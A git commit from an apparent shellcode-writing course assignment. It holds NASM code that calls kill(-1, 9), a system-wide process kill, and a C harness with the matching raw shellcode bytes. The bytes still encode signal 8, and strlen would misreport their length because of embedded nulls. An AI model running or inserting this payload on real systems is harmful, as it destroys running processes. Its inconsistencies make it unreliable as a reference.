d45b5974700663e36d1055347aec8f085b34c47b
TorturedProphet <dylanm16@yahoo.com>
2019-03-11 21:59:53 -0400

    Fix value for Assignment 6

--- Assignment_6/kill_ps/kill_ps_new.nasm
+++ Assignment_6/kill_ps/kill_ps_new.nasm
@@ -7,5 +7,5 @@ _start:
 	mov al, 37 ; Load syscall straight into al
 	mov ebx, 0 ; Set EBX to 0
 	sub ebx, 1 ; Make EBX -1
-	mov ecx, 8 
+	mov ecx, 9 
 	int 0x80
---
+++ Assignment_6/shellcode.c
@@ -0,0 +1,17 @@
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+
+"\xb0\x25\xbb\x00\x00\x00\x00\x83\xeb\x01\xb9\x08\x00\x00\x00\xcd\x80";
+
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+
+}
+
+	
